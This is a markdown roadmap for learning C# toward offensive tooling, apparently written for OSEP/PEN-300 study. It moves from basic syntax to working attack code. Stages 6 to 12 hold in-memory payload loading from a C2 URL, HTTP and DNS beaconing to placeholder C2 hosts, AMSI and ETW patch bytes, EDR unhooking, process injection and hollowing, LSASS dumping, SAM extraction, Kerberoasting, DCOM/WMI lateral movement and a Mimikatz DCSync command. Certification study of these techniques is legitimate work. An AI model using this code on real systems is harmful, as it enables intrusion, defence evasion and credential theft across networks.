# C# Red Team Roadmap — OSEP Edition
> A complete, structured path from C# basics to advanced offensive tooling, fully aligned with PEN-300 / OSEP requirements.

---

## 🟢 Stage 1 — Language Basics
> Mandatory. No tool can be written without syntax fundamentals.

### Step 1 — Hello World & Program Structure
`namespace`, `class`, `Main()` — program entry point.
```csharp
Console.WriteLine("Hello, World!");
```

### Step 2 — Variables & Data Types
`int`, `double`, `float`, `bool`, `char`, `string`. Value type vs reference type.
```csharp
int port = 4444;
string host = "10.0.0.1";
bool isOpen = true;
```

### Step 3 — Type Conversion
`Convert.ToInt32()`, `int.Parse()`, `int.TryParse()`. Essential when parsing network data.
```csharp
string input = "4444";
int port = int.Parse(input);
```

### Step 4 — Operators
Arithmetic (`+`, `-`, `*`, `/`, `%`), comparison (`==`, `!=`, `>`, `<`), logical (`&&`, `||`, `!`), assignment (`+=`, `-=`).

### Step 5 — String Operations
`Length`, `ToUpper()`, `ToLower()`, `Trim()`, `Replace()`, `Contains()`, `Split()`, `Substring()`, string interpolation.
```csharp
string beacon = $"HOST={host};PORT={port}";
string[] parts = "10.0.0.1:4444".Split(':');
```

### Step 6 — Conditional Statements
`if`, `else if`, `else`, `switch`.
```csharp
if (isOpen) Console.WriteLine("[+] Port open");
else Console.WriteLine("[-] Filtered");
```

### Step 7 — Ternary & Null Coalescing
`? :` and `??` — compact conditionals.
```csharp
string status = isOpen ? "OPEN" : "CLOSED";
string target = input ?? "127.0.0.1";
```

### Step 8 — Loops: for & while
Loop variables, `break`, `continue`.
```csharp
for (int port = 1; port <= 1024; port++)
    Scan(host, port);
```

### Step 9 — Loops: foreach & do-while
Iterating over collections.
```csharp
foreach (string host in liveHosts)
    Console.WriteLine($"[+] {host}");
```

### Step 10 — Methods
Parameters, return types, `void`, overloading.
```csharp
bool IsPortOpen(string host, int port) => TcpConnect(host, port);
```

---

## 🔵 Stage 2 — Collections
> Every Red Team tool stores and processes data — hosts, ports, credentials, results.

### Step 11 — Arrays
Fixed-size. Shellcode byte arrays, static port lists.
```csharp
byte[] shellcode = { 0x90, 0x90, 0xCC };
int[] commonPorts = { 22, 80, 443, 3389 };
```

### Step 12 — List\<T\>
Dynamic collection. Live hosts, open ports, loot accumulation.
```csharp
var liveHosts = new List<string>();
liveHosts.Add("10.0.0.1");
liveHosts.Sort();
```

### Step 13 — Dictionary\<TKey, TValue\>
Key-value store. Credential storage, port-to-service mapping, recon results.
```csharp
var creds = new Dictionary<string, string>();
creds["admin"] = "Password123!";
var portMap = new Dictionary<int, string> { {22, "SSH"}, {3389, "RDP"} };
```

### Step 14 — HashSet\<T\>
Unique elements only. Deduplicating scanned IPs.
```csharp
var scanned = new HashSet<string>();
scanned.Add("10.0.0.1");
scanned.Add("10.0.0.1"); // ignored
```

### Step 15 — Queue\<T\> & Stack\<T\>
C2 task queue (FIFO), execution history (LIFO).
```csharp
var taskQueue = new Queue<string>();
taskQueue.Enqueue("whoami");
taskQueue.Enqueue("ipconfig");
string next = taskQueue.Dequeue(); // → "whoami"
```

---

## 🟣 Stage 3 — Object-Oriented Programming
> Structuring tools professionally — Scanner, Beacon, Implant, C2 channel classes.

### Step 16 — Classes & Objects
Structuring tools — Scanner, Beacon, Implant classes.
```csharp
class PortScanner
{
    public string Target { get; set; }
    public List<int> OpenPorts { get; set; } = new();
}
```

### Step 17 — Properties & Access Modifiers
`public`, `private`, `internal`. Encapsulating implant configs.
```csharp
class BeaconConfig
{
    public string C2Host { get; set; }
    private int _sleepInterval = 60;
    public int SleepInterval => _sleepInterval;
}
```

### Step 18 — Constructors
Parameterized constructors — tool initialization.
```csharp
class ReverseShell
{
    private string _host;
    private int _port;

    public ReverseShell(string host, int port)
    {
        _host = host;
        _port = port;
    }
}
```

### Step 19 — Interfaces
`interface` — unifying different C2 channels under a single contract. Defines *what*, not *how*.
```csharp
interface IC2Channel
{
    string Receive();
    void Send(string data);
}

class HttpChannel : IC2Channel
{
    public string Receive() => PollHttp();
    public void Send(string data) => PostHttp(data);
}

class TcpChannel : IC2Channel
{
    public string Receive() => ReadSocket();
    public void Send(string data) => WriteSocket(data);
}
```

### Step 20 — Polymorphism & Virtual Methods
Overriding base class behavior for different C2 channel implementations.
```csharp
class C2Channel
{
    public virtual string Receive() => "";
}

class HttpChannel : C2Channel
{
    public override string Receive() => PollHttp();
}
```

### Step 21 — Static Members & Static Classes
Utility classes — helper methods, constant config values.
```csharp
static class Utils
{
    public static string XorEncrypt(string data, byte key) { ... }
    public static byte[] ToBytes(string hex) { ... }
}
```

---

## 🟡 Stage 4 — LINQ
> Filter, transform, and query collections — essential for processing recon data.

### Step 22 — Where & Select
Filter by condition + transform. Processing port and host lists.
```csharp
var highPorts = ports.Where(p => p > 1024).ToList();
var hostnames = results.Select(r => r.Hostname).ToList();
```

### Step 23 — OrderBy, GroupBy, Distinct
Sort results, group, remove duplicates.
```csharp
var sorted = openPorts.OrderBy(p => p).ToList();
var unique = foundHosts.Distinct().ToList();
```

### Step 24 — First, Any, All, Count
Quick checks — is there any admin? Is a port open?
```csharp
bool hasAdmin = users.Any(u => u.Contains("admin"));
int openCount = ports.Count(p => p < 1024);
string first = liveHosts.FirstOrDefault();
```

---

## 🔴 Stage 5 — Essentials
> Every Red Team tool in production relies on these.

### Step 25 — Exception Handling
Mandatory in network tooling — connection failures, timeouts, access denied.
```csharp
try
{
    using TcpClient tc = new TcpClient();
    tc.Connect(host, port);
}
catch (SocketException ex)
{
    Console.WriteLine($"[-] {host}:{port} — {ex.Message}");
}
finally { /* cleanup */ }
```

### Step 26 — Nullable Types & Null Safety
Without null checks, tools crash.
```csharp
string? response = GetC2Response();
string cmd = response ?? "sleep";
int? pid = FindProcess("lsass")?.Id;
```

### Step 27 — Delegates, Lambda, Func/Action
Callbacks, async operations, LINQ chains.
```csharp
Action<string> log = msg => Console.WriteLine($"[*] {msg}");
Func<string, int, bool> isOpen = (host, port) => TcpConnect(host, port);
```

### Step 28 — using & IDisposable
Network connections and file streams must be disposed. `using` calls `Dispose()` automatically.
```csharp
using (TcpClient tc = new TcpClient())
{
    tc.Connect(host, port);
}

class ScanSession : IDisposable
{
    private TcpClient _client = new TcpClient();
    public void Dispose() => _client?.Close();
}
```

### Step 29 — Encoding & Byte Conversion
Shellcode, beacon data, XOR encryption, Base64 payloads — all byte operations.
```csharp
byte[] bytes   = Encoding.UTF8.GetBytes("whoami");
string b64     = Convert.ToBase64String(bytes);
byte[] decoded = Convert.FromBase64String(b64);

byte key = 0x41;
byte[] xored = bytes.Select(b => (byte)(b ^ key)).ToArray();
```

### Step 30 — File I/O
Reading wordlists, writing loot, loading configs — required by every tool.
```csharp
string[] passwords = File.ReadAllLines("wordlist.txt");
File.AppendAllText("results.txt", $"[+] {host}:{port} OPEN\n");
List<string> targets = File.ReadAllLines("targets.txt").ToList();
```

### Step 31 — Async / Await
The most critical topic for network tools. Synchronous scan = slow. Async scan = fast.
```csharp
async Task ScanPortAsync(string host, int port)
{
    try
    {
        using TcpClient tc = new TcpClient();
        await tc.ConnectAsync(host, port);
        Console.WriteLine($"[+] {port} OPEN");
    }
    catch { /* closed */ }
}

var tasks = Enumerable.Range(1, 1024)
    .Select(p => ScanPortAsync(host, p));

await Task.WhenAll(tasks);
```

---

## ⚫ Stage 6 — Windows Internals & API
> This is where Red Team C# tooling actually begins.

### Step 32 — P/Invoke Basics
Calling Windows API functions directly from C# using `DllImport`.
```csharp
using System.Runtime.InteropServices;

[DllImport("kernel32.dll")]
static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

[DllImport("kernel32.dll")]
static extern bool CloseHandle(IntPtr handle);
```

### Step 33 — Windows Data Types
Mapping Windows types to C# — `HANDLE`, `DWORD`, `LPVOID`, `BOOL`.
```csharp
// Windows HANDLE → IntPtr
// Windows DWORD  → uint
// Windows BOOL   → bool
// Windows LPVOID → IntPtr

[DllImport("kernel32.dll")]
static extern IntPtr VirtualAlloc(
    IntPtr lpAddress,
    uint dwSize,
    uint flAllocationType,
    uint flProtect
);
```

### Step 34 — Process Enumeration
Listing running processes — finding targets for injection or privilege escalation.
```csharp
using System.Diagnostics;

foreach (Process proc in Process.GetProcesses())
{
    Console.WriteLine($"[{proc.Id}] {proc.ProcessName}");
}

Process lsass = Process.GetProcessesByName("lsass").FirstOrDefault();
```

### Step 35 — Handle & Memory Basics
Opening process handles, reading/writing remote process memory.
```csharp
[DllImport("kernel32.dll")]
static extern bool ReadProcessMemory(
    IntPtr hProcess,
    IntPtr lpBaseAddress,
    byte[] lpBuffer,
    int nSize,
    out int lpNumberOfBytesRead
);

[DllImport("kernel32.dll")]
static extern bool WriteProcessMemory(
    IntPtr hProcess,
    IntPtr lpBaseAddress,
    byte[] lpBuffer,
    int nSize,
    out int lpNumberOfBytesWritten
);
```

### Step 36 — Token & Privilege Basics
Querying and adjusting process token privileges.
```csharp
[DllImport("advapi32.dll")]
static extern bool OpenProcessToken(
    IntPtr ProcessHandle,
    uint DesiredAccess,
    out IntPtr TokenHandle
);

// TOKEN_QUERY             = 0x0008
// TOKEN_ADJUST_PRIVILEGES = 0x0020
```

---

## 🔥 Stage 7 — Memory Manipulation
> Required for shellcode execution, injection, and in-memory payload loading.

### Step 37 — unsafe & Pointers
Direct memory access using C# pointers. Required for low-level operations.
```csharp
unsafe
{
    int value = 42;
    int* ptr = &value;
    Console.WriteLine(*ptr); // → 42

    fixed (byte* p = shellcode)
    {
        // p is a raw pointer to the byte array
    }
}
```

### Step 38 — Marshal Class
Converting between managed and unmanaged memory — bridge between C# and Windows API.
```csharp
using System.Runtime.InteropServices;

IntPtr ptr = Marshal.AllocHGlobal(shellcode.Length);
Marshal.Copy(shellcode, 0, ptr, shellcode.Length);

byte[] buffer = new byte[shellcode.Length];
Marshal.Copy(ptr, buffer, 0, shellcode.Length);

Marshal.FreeHGlobal(ptr);
```

### Step 39 — VirtualAlloc & Memory Protection
Allocating executable memory — foundation of shellcode execution.
```csharp
const uint MEM_COMMIT  = 0x1000;
const uint MEM_RESERVE = 0x2000;
const uint PAGE_EXECUTE_READWRITE = 0x40;

[DllImport("kernel32.dll")]
static extern IntPtr VirtualAlloc(
    IntPtr lpAddress, uint dwSize,
    uint flAllocationType, uint flProtect
);

[DllImport("kernel32.dll")]
static extern bool VirtualProtect(
    IntPtr lpAddress, uint dwSize,
    uint flNewProtect, out uint lpflOldProtect
);
```

### Step 40 — CreateThread & Shellcode Execution
Executing shellcode in the current process via a new thread.
```csharp
[DllImport("kernel32.dll")]
static extern IntPtr CreateThread(
    IntPtr lpThreadAttributes,
    uint dwStackSize,
    IntPtr lpStartAddress,
    IntPtr lpParameter,
    uint dwCreationFlags,
    out uint lpThreadId
);

[DllImport("kernel32.dll")]
static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMs);

// Execution flow:
// VirtualAlloc → Marshal.Copy(shellcode) → CreateThread → WaitForSingleObject
```

---

## 🟠 Stage 8 — Reflection & In-Memory Loading
> Loading and executing assemblies entirely in memory — no file touches disk.

### Step 41 — Reflection Basics
Inspecting types, methods, and properties at runtime.
```csharp
using System.Reflection;

Assembly asm = Assembly.GetExecutingAssembly();
foreach (Type t in asm.GetTypes())
    Console.WriteLine(t.FullName);

Type target = asm.GetType("MyNamespace.Payload");
MethodInfo method = target.GetMethod("Run");
method.Invoke(null, null);
```

### Step 42 — Assembly.Load() — In-Memory Execution
Loading a .NET assembly from a byte array — the payload never touches disk.
```csharp
byte[] asmBytes = await DownloadPayload(c2Url);

Assembly asm = Assembly.Load(asmBytes);

Type type = asm.GetType("Payload.Program");
MethodInfo run = type.GetMethod("Execute");
run.Invoke(null, new object[] { args });
```

### Step 43 — Dynamic Invocation
Calling methods dynamically without static references — useful for evading static analysis.
```csharp
// Instead of direct P/Invoke (detectable):
// var result = VirtualAlloc(...);

// Dynamic invocation via reflection:
Type kernel32 = Type.GetType("...");
MethodInfo virtualAlloc = kernel32.GetMethod("VirtualAlloc");
object result = virtualAlloc.Invoke(null, new object[] { ... });
```

### Step 44 — PowerShell Runspace (AppLocker Bypass)
Creating a custom PowerShell runspace from C# to bypass AppLocker and constrained language mode.
```csharp
using System.Management.Automation;
using System.Management.Automation.Runspaces;

// Create a custom runspace — bypasses AppLocker script rules
Runspace rs = RunspaceFactory.CreateRunspace();
rs.Open();

Pipeline pipeline = rs.CreatePipeline();
pipeline.Commands.AddScript("whoami; hostname; ipconfig");
pipeline.Commands.Add("Out-String");

var results = pipeline.Invoke();
foreach (var result in results)
    Console.WriteLine(result.ToString());

rs.Close();

// Why this works:
// AppLocker blocks .ps1 files on disk.
// A runspace executes PowerShell entirely in memory,
// never writing a script file — AppLocker has no file to evaluate.
```

---

## 🔴 Stage 9 — Networking & C2 Communication
> Building real C2 channels — HTTP, TCP, DNS, Named Pipes.

### Step 45 — TCP Client & Server
Raw TCP communication — foundation of reverse shells and C2 channels.
```csharp
// TCP Client (implant side)
using TcpClient client = new TcpClient();
await client.ConnectAsync("10.0.0.1", 4444);
NetworkStream stream = client.GetStream();
byte[] buf = new byte[4096];
int n = await stream.ReadAsync(buf, 0, buf.Length);
string cmd = Encoding.UTF8.GetString(buf, 0, n);

// TCP Listener (C2 side)
TcpListener listener = new TcpListener(IPAddress.Any, 4444);
listener.Start();
TcpClient conn = await listener.AcceptTcpClientAsync();
```

### Step 46 — HTTP Beaconing
HTTP-based C2 communication — blends with normal web traffic.
```csharp
using HttpClient http = new HttpClient();

// Beacon check-in — GET task
string task = await http.GetStringAsync("http://c2.host/task");

// Send results — POST output
var content = new StringContent(output, Encoding.UTF8, "application/json");
await http.PostAsync("http://c2.host/result", content);

// Jitter — randomized sleep to evade timing detection
int jitter = new Random().Next(1000, 5000);
await Task.Delay(sleepInterval * 1000 + jitter);
```

### Step 47 — DNS over HTTPS (DoH) Beaconing
Covert C2 channel via DNS queries — bypasses many network-layer controls.
```csharp
string encoded = Convert.ToBase64String(Encoding.UTF8.GetBytes(output))
    .Replace("+", "-").Replace("/", "_").Replace("=", "");

string dnsQuery = $"{encoded}.c2domain.com";

string dohUrl = $"https://1.1.1.1/dns-query?name={dnsQuery}&type=TXT";
string response = await http.GetStringAsync(dohUrl);
```

### Step 48 — Named Pipes & Impersonation
Lateral movement channel — used for inter-process and cross-host C2.
Impersonation lets the pipe server steal the connecting client's token.
```csharp
using System.IO.Pipes;
using System.Runtime.InteropServices;

[DllImport("advapi32.dll")]
static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

// Server (C2 / operator side)
using NamedPipeServerStream server = new NamedPipeServerStream(
    "redteam", PipeDirection.InOut, 1,
    PipeTransmissionMode.Byte, PipeOptions.None);

await server.WaitForConnectionAsync();

// Steal the connected client's security token
ImpersonateNamedPipeClient(server.SafePipeHandle.DangerousGetHandle());
// Now running under the client's identity

// Client (implant side)
using NamedPipeClientStream client = new NamedPipeClientStream(
    ".", "redteam", PipeDirection.InOut);
await client.ConnectAsync();
```

### Step 49 — MSSQL Interaction from C#
Microsoft SQL Server is a common lateral movement and privilege escalation vector.
`xp_cmdshell` enables OS command execution directly from SQL.
```csharp
using System.Data.SqlClient;

string connStr = "Server=10.0.0.5;Database=master;User Id=sa;Password=Password123!;";

using SqlConnection conn = new SqlConnection(connStr);
conn.Open();

// Enable xp_cmdshell
string enableCmd = @"
    EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
    EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
new SqlCommand(enableCmd, conn).ExecuteNonQuery();

// Execute OS command via SQL
string query = "EXEC xp_cmdshell 'whoami'";
using SqlDataReader reader = new SqlCommand(query, conn).ExecuteReader();
while (reader.Read())
    Console.WriteLine(reader[0]?.ToString());

// Linked server enumeration — jump to another SQL server
string linkedQuery = "SELECT name FROM sys.servers WHERE is_linked = 1";
using SqlDataReader lr = new SqlCommand(linkedQuery, conn).ExecuteReader();
while (lr.Read())
    Console.WriteLine($"[Linked] {lr["name"]}");
```

---

## 🟤 Stage 10 — AV / EDR Evasion
> Techniques to bypass security controls — detection evasion, hook circumvention.

### Step 50 — AMSI Bypass
Patching the Anti-Malware Scan Interface in memory to prevent script scanning.
```csharp
[DllImport("kernel32")]
static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

[DllImport("kernel32")]
static extern IntPtr LoadLibrary(string name);

[DllImport("kernel32")]
static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
    uint flNewProtect, out uint lpflOldProtect);

// Concept: find AmsiScanBuffer → patch first bytes → return clean
// AmsiScanBuffer patch (returns AMSI_RESULT_CLEAN = 1):
// byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
```

### Step 51 — ETW Patching
Disabling Event Tracing for Windows to blind EDR telemetry collection.
```csharp
// ETW is used by EDRs to collect runtime telemetry.
// EtwEventWrite() in ntdll.dll can be patched to suppress events.

// Same pattern as AMSI:
// LoadLibrary("ntdll.dll") → GetProcAddress("EtwEventWrite")
// → VirtualProtect(RW) → patch bytes → VirtualProtect(restore)
// Patch: { 0xC3 } — ret instruction, function returns immediately
```

### Step 52 — Unhooking via Fresh NTDLL
EDRs hook ntdll.dll functions. Loading a fresh copy from disk bypasses their hooks.
```csharp
// EDR hook flow:
// Your code → ntdll (hooked) → EDR inspection → syscall

// Unhook flow:
// 1. Read ntdll.dll from disk (C:\Windows\System32\ntdll.dll)
// 2. Map it manually into memory
// 3. Overwrite the hooked .text section with the clean version
// 4. Your code now calls unhooked syscalls directly

byte[] freshNtdll = File.ReadAllBytes(@"C:\Windows\System32\ntdll.dll");
// Parse PE headers → locate .text section → overwrite in-process ntdll
```

### Step 53 — Direct Syscalls
Bypassing EDR userland hooks by invoking syscalls directly without going through ntdll.
```csharp
// Standard API call (hookable):
// VirtualAlloc() → ntdll.NtAllocateVirtualMemory (hooked by EDR)

// Direct syscall approach:
// Embed raw syscall stub → call kernel directly
// Tools: SysWhispers2/3, D/Invoke

// Syscall stub example (x64 assembly):
// mov r10, rcx
// mov eax, <syscall number>
// syscall
// ret
```

### Step 54 — Payload Obfuscation
Hiding shellcode from static AV signatures — encryption and encoding at rest.
```csharp
// XOR encrypt shellcode before embedding
byte key = 0x37;
byte[] encrypted = shellcode.Select(b => (byte)(b ^ key)).ToArray();

// Decrypt at runtime just before execution
byte[] decrypted = encrypted.Select(b => (byte)(b ^ key)).ToArray();

// AES encryption for stronger obfuscation
using Aes aes = Aes.Create();
aes.Key = Convert.FromBase64String(storedKey);
aes.IV  = Convert.FromBase64String(storedIV);
ICryptoTransform decryptor = aes.CreateDecryptor();
byte[] plain = decryptor.TransformFinalBlock(encrypted, 0, encrypted.Length);
```

### Step 55 — Process Injection — Classic
Injecting shellcode into a remote process — the foundation of most post-exploitation.
```csharp
// Classic injection flow:
// 1. OpenProcess(PROCESS_ALL_ACCESS, pid)
// 2. VirtualAllocEx(hProcess, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
// 3. WriteProcessMemory(hProcess, allocAddr, shellcode)
// 4. CreateRemoteThread(hProcess, allocAddr)

[DllImport("kernel32.dll")]
static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
    uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
static extern IntPtr CreateRemoteThread(IntPtr hProcess,
    IntPtr lpThreadAttributes, uint dwStackSize,
    IntPtr lpStartAddress, IntPtr lpParameter,
    uint dwCreationFlags, out uint lpThreadId);
```

### Step 56 — Process Hollowing
Creating a suspended process, replacing its memory with a payload, then resuming.
```csharp
// Process hollowing flow:
// 1. CreateProcess(target, SUSPENDED)
// 2. NtUnmapViewOfSection — hollow out the original image
// 3. VirtualAllocEx — allocate space for payload
// 4. WriteProcessMemory — write payload
// 5. SetThreadContext — update entry point register (RCX/EIP)
// 6. ResumeThread — execute payload under legitimate process identity

[DllImport("kernel32.dll")]
static extern bool CreateProcess(string lpApplicationName,
    string lpCommandLine, IntPtr lpProcessAttributes,
    IntPtr lpThreadAttributes, bool bInheritHandles,
    uint dwCreationFlags, IntPtr lpEnvironment,
    string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo,
    out PROCESS_INFORMATION lpProcessInformation);
```

---

## 🟣 Stage 11 — Credential Access
> Dumping and abusing Windows credentials — the core of post-exploitation.

### Step 57 — Token Impersonation
Stealing and impersonating Windows security tokens from privileged processes.
```csharp
[DllImport("advapi32.dll")]
static extern bool OpenProcessToken(IntPtr hProcess, uint dwAccess, out IntPtr hToken);

[DllImport("advapi32.dll")]
static extern bool DuplicateTokenEx(IntPtr hToken, uint dwAccess,
    IntPtr lpTokenAttr, int impersonationLevel,
    int tokenType, out IntPtr phNewToken);

[DllImport("advapi32.dll")]
static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

// TOKEN_ALL_ACCESS = 0xF01FF
// Flow: OpenProcess → OpenProcessToken → DuplicateTokenEx → ImpersonateLoggedOnUser
// Impersonate SYSTEM by targeting a SYSTEM-owned process (e.g., winlogon.exe)
```

### Step 58 — Custom MiniDump (LSASS)
Writing a custom `MiniDumpWriteDump` implementation to dump LSASS memory and avoid AV signatures on the standard API call pattern.
```csharp
[DllImport("dbghelp.dll")]
static extern bool MiniDumpWriteDump(
    IntPtr hProcess,
    uint ProcessId,
    IntPtr hFile,
    uint DumpType,           // MiniDumpWithFullMemory = 2
    IntPtr ExceptionParam,
    IntPtr UserStreamParam,
    IntPtr CallbackParam
);

// Standard approach (flagged by most AVs):
Process lsass = Process.GetProcessesByName("lsass")[0];
IntPtr hProcess = OpenProcess(0x1F0FFF, false, lsass.Id);
using FileStream fs = new FileStream("lsass.dmp", FileMode.Create);
MiniDumpWriteDump(hProcess, (uint)lsass.Id,
    fs.SafeFileHandle.DangerousGetHandle(), 2,
    IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

// Evasion: use a custom callback or snapshot approach,
// or read LSASS memory manually via ReadProcessMemory
// to reconstruct the dump without calling MiniDumpWriteDump directly.
```

### Step 59 — SAM & Registry Credential Extraction
Reading SAM hive and SYSTEM hive to extract local account NTLM hashes offline.
```csharp
// SAM hives are locked at runtime — use Volume Shadow Copy or reg save
// reg save HKLM\SAM   C:\Temp\sam.hive
// reg save HKLM\SYSTEM C:\Temp\system.hive

// From C#: invoke reg save via Process.Start or via P/Invoke to RegSaveKey
[DllImport("advapi32.dll")]
static extern int RegOpenKeyEx(IntPtr hKey, string subKey,
    int options, int samDesired, out IntPtr phkResult);

[DllImport("advapi32.dll")]
static extern int RegSaveKey(IntPtr hKey, string lpFile, IntPtr secAttr);

// HKEY_LOCAL_MACHINE = 0x80000002
// Then parse hive offline with tools like impacket's secretsdump
// or implement SYSKEY decryption manually in C#
```

### Step 60 — Kerberos Ticket Manipulation
Requesting, listing, and injecting Kerberos tickets — foundation of Pass-the-Ticket and Kerberoasting.
```csharp
// C# Kerberos operations rely on SSPI (Security Support Provider Interface)
// or direct calls to LSA (Local Security Authority)

[DllImport("secur32.dll")]
static extern int LsaConnectUntrusted(out IntPtr LsaHandle);

[DllImport("secur32.dll")]
static extern int LsaCallAuthenticationPackage(
    IntPtr LsaHandle, uint AuthenticationPackage,
    IntPtr ProtocolSubmitBuffer, uint SubmitBufferLength,
    out IntPtr ProtocolReturnBuffer, out uint ReturnBufferLength,
    out int ProtocolStatus);

// Key operations:
// KERB_RETRIEVE_TKT_REQUEST  → extract TGT/TGS from memory
// KERB_SUBMIT_TKT_REQUEST    → inject a forged/stolen ticket (Pass-the-Ticket)
// KERB_PURGE_TKT_CACHE_REQUEST → clear tickets

// In practice: use Rubeus source as reference for LSA ticket operations
```

---

## 🔵 Stage 12 — Active Directory Exploitation
> Enumerating and attacking AD from C# — LDAP queries, ACL abuses, lateral movement.

### Step 61 — LDAP Enumeration
Querying Active Directory via LDAP to enumerate users, groups, SPNs, and DACLs.
```csharp
using System.DirectoryServices;

// Connect to the domain
DirectoryEntry entry = new DirectoryEntry("LDAP://DC=corp,DC=local");
DirectorySearcher searcher = new DirectorySearcher(entry);

// Enumerate all users
searcher.Filter = "(&(objectClass=user)(objectCategory=person))";
searcher.PropertiesToLoad.Add("samaccountname");
searcher.PropertiesToLoad.Add("memberof");
searcher.PropertiesToLoad.Add("servicePrincipalName");

foreach (SearchResult result in searcher.FindAll())
{
    string username = result.Properties["samaccountname"][0].ToString();
    Console.WriteLine($"[User] {username}");

    // SPN present = Kerberoastable account
    if (result.Properties.Contains("servicePrincipalName"))
        Console.WriteLine($"  [!] Kerberoastable: {username}");
}
```

### Step 62 — Kerberoasting
Requesting service tickets for SPN accounts and extracting them for offline cracking.
```csharp
using System.IdentityModel.Tokens;

// Find Kerberoastable accounts (SPN set, not krbtgt)
searcher.Filter = "(&(objectClass=user)(servicePrincipalName=*)" +
                  "(!samaccountname=krbtgt))";
searcher.PropertiesToLoad.Add("servicePrincipalName");
searcher.PropertiesToLoad.Add("samaccountname");

foreach (SearchResult result in searcher.FindAll())
{
    string spn = result.Properties["servicePrincipalName"][0].ToString();
    Console.WriteLine($"[*] Requesting TGS for: {spn}");

    // Request TGS — Windows automatically fetches it when you access the SPN
    // The ticket is RC4 or AES encrypted with the service account's password hash
    KerberosRequestorSecurityToken token =
        new KerberosRequestorSecurityToken(spn);

    // Extract the raw ticket bytes for offline cracking (hashcat -m 13100)
    byte[] ticket = token.GetRequest();
    Console.WriteLine(Convert.ToBase64String(ticket));
}
```

### Step 63 — DACL / ACL Enumeration
Reading discretionary ACLs on AD objects to find privilege escalation paths (WriteDACL, GenericAll, GenericWrite, etc.).
```csharp
using System.DirectoryServices;
using System.Security.AccessControl;

DirectoryEntry target = new DirectoryEntry("LDAP://CN=Domain Admins,CN=Users,DC=corp,DC=local");
ActiveDirectorySecurity security = target.ObjectSecurity;

foreach (ActiveDirectoryAccessRule rule in security.GetAccessRules(
    true, true, typeof(System.Security.Principal.NTAccount)))
{
    Console.WriteLine($"Principal : {rule.IdentityReference}");
    Console.WriteLine($"Rights    : {rule.ActiveDirectoryRights}");
    Console.WriteLine($"Type      : {rule.AccessControlType}");
    Console.WriteLine();

    // Dangerous rights to look for:
    // GenericAll, GenericWrite, WriteDACL, WriteOwner, AllExtendedRights
}
```

### Step 64 — COM Object Lateral Movement
Using COM objects from C# for fileless lateral movement to remote hosts.
```csharp
using System.Runtime.InteropServices;

// MMC20.Application COM object — executes commands on a remote host
// Requires DCOM access (port 135) and local admin on target

Type comType = Type.GetTypeFromProgID("MMC20.Application", "10.0.0.5");
object mmc   = Activator.CreateInstance(comType);

// Navigate to the View.ExecuteShellCommand method via reflection
object doc    = comType.InvokeMember("Document",
    BindingFlags.GetProperty, null, mmc, null);
object view   = doc.GetType().InvokeMember("ActiveView",
    BindingFlags.GetProperty, null, doc, null);

view.GetType().InvokeMember("ExecuteShellCommand",
    BindingFlags.InvokeMethod, null, view,
    new object[] { "cmd.exe", null, "/c whoami > C:\\Temp\\out.txt", "7" });

// Other COM objects usable for lateral movement:
// ShellWindows    (CLSID: 9BA05972-F6A8-11CF-A442-00A0C90A8F39)
// ShellBrowserWindow (CLSID: C08AFD90-F2A1-11D1-8455-00A0C91F3880)
```

### Step 65 — WMI Lateral Movement
Using WMI from C# to execute commands on remote hosts — a classic living-off-the-land technique.
```csharp
using System.Management;

// Connect to remote WMI service
ConnectionOptions options = new ConnectionOptions
{
    Username = "CORP\\Administrator",
    Password  = "Password123!",
    Impersonation = ImpersonationLevel.Impersonate,
    Authentication = AuthenticationLevel.PacketPrivacy
};

ManagementScope scope = new ManagementScope(
    $"\\\\10.0.0.5\\root\\cimv2", options);
scope.Connect();

// Execute a command via Win32_Process.Create
ObjectGetOptions objGetOptions = new ObjectGetOptions();
ManagementPath managementPath = new ManagementPath("Win32_Process");
ManagementClass processClass   = new ManagementClass(scope, managementPath, objGetOptions);

ManagementBaseObject inParams = processClass.GetMethodParameters("Create");
inParams["CommandLine"] = "cmd.exe /c whoami > C:\\Temp\\out.txt";

ManagementBaseObject outParams = processClass.InvokeMethod("Create", inParams, null);
Console.WriteLine($"[*] Process created with PID: {outParams["ProcessId"]}");
```

### Step 66 — DCSync Attack
Abusing the DS-Replication-Get-Changes privilege to pull NTLM hashes directly from a Domain Controller without touching LSASS.
```csharp
// DCSync does not require running code on the DC.
// Any account with "Replicating Directory Changes" + "Replicating Directory Changes All"
// can request replication data remotely — including password hashes.

// Affected rights (check with Step 63 ACL enum):
// DS-Replication-Get-Changes         (1131f6aa-...)
// DS-Replication-Get-Changes-All     (1131f6ad-...)

// In C#: use DirectoryServices with MS-DRSR protocol or invoke Mimikatz/Impacket
// via Process.Start for tooling context, or implement DRSGetNCChanges via P/Invoke.

// Minimal C# approach — invoke via Mimikatz runspace (from Step 44):
pipeline.Commands.AddScript(
    @"Invoke-Mimikatz -Command '""lsadump::dcsync /domain:corp.local /all /csv""'");

// Accounts commonly targeted:
// krbtgt  → Golden Ticket material
// All domain accounts → full password hash dump
```

### Step 67 — Pass-the-Hash (PTH) from C#
Using an NTLM hash instead of a plaintext password to authenticate to remote services.
```csharp
// PTH abuses NTLM authentication — the hash IS the credential.
// Native Windows APIs don't expose PTH directly from managed code.
// Common approaches from C#:

// 1. Inject hash into a sacrificial logon session via LogonUser + token manipulation
[DllImport("advapi32.dll", SetLastError = true)]
static extern bool LogonUser(
    string lpszUsername, string lpszDomain, string lpszPassword,
    int dwLogonType, int dwLogonProvider, out IntPtr phToken);

// LOGON32_LOGON_NEW_CREDENTIALS = 9
// LOGON32_PROVIDER_DEFAULT      = 0
// This creates a network-only token — outbound connections use the supplied creds

// 2. Overwrite the NTLM hash in an existing logon session via sekurlsa::pth pattern
// Requires SeDebugPrivilege + write access to LSASS logon session structures

// 3. Use Impacket's psexec/smbclient from a PTH-capable implant
// or NTLMv2 relay via SMB from a C# listener

